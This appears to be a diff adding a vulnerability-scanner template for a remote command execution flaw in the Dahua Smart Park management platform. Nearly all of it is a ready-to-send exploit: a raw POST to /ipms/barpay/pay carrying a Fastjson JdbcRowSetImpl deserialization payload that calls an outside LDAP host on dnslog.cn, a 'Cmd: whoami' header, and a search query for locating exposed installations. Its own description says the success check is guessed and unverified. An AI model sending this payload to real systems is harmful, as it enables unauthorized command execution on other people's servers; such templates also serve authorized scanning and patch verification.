@@ -1,0 +1,38 @@
+id: poc-e53df9b7cc43d7f1f34b
+info:
+  name: 大华智慧园区综合管理平台pay远程命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e53df9b7cc43d7f1f34b55fbf6478161
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e53df9b7cc43d7f1f34b55fbf6478161
+    fofa: + hunter:`app.name="Dahua 大华 智慧园区管理平台"`
+http:
+- raw:
+  - 'POST /ipms/barpay/pay HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Connection: close
+
+    Content-Length: 127
+
+    Accept-Encoding: gzip, deflate
+
+    Cmd: whoami
+
+    Content-Type: application/json
+
+
+    {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://uh8aga.dnslog.cn", "autoCommit": true}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
